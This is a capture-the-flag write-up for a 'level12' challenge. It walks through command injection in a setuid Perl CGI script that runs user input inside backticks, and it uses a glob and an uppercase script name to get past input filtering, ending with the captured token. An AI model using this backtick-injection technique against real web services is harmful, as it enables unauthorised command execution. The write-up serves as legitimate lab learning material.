L-> -rwsr-sr-x+ 1 flag12 [...] level12.pl*

ok now you know the exploit with s byte

cat level12.pl
|
L-> # localhost:4646
L-> [...]
L-> $xx =~ tr/a-z/A-Z/;
L-> $xx =~ s/\s.*//;
L-> @output = `egrep "^$xx" /tmp/xd 2>&1`;
L-> [...]
L-> n(t(param("x"), param("y")));

so we see that we can curl on localhost:4646/level12.pl with x and y params
the y params is useless as we can see in the script
otherwise we see @output which is using a shell command usigng regex
the first regex will capitilize every char of the x params 
the second remove every whitespace so we can't just do a x="/bin/getflag > /tmp/token"
because it will turn it into "/BIN/GETFLAG>/TMP/TOKEN"

so we need to create a script with a capitilize name which make it for us

echo "/bin/getflag > /tmp/token" > /tmp/SCRIPT

chmod +x /tmp/SCRIPT

but another problem, /tmp will be turned into /TMP so we need to use * in our request

like this we will have something like x='`/*/SCRIPT`'

the program will launch ou script and we will be able to get the flag let try

curl 127.0.0.1:4646/level12.pl?x='`/*/SCRIPT`'

L-> ..

ok lets try to cat it

cat /tmp/token

L-> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
